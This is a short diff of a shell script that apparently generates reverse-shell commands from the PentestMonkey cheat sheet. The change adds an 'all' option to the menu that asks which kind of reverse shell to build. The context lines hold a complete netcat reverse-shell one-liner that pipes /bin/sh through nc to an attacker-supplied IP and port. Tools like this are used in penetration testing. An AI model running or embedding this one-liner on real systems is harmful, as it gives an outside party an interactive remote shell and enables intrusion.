@@ -35,7 +35,7 @@ echo ""
 #PentestMonkey Reverse Shell Options
 
 
-echo -ne "${blue}Which type of reverse shell command line do you want to use? (rm, bash, nc, python or php):${boring} " && read reverse
+echo -ne "${blue}Which type of reverse shell command line do you want to use? (rm, bash, nc, python, php or all):${boring} " && read reverse
 
 rm="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"
 
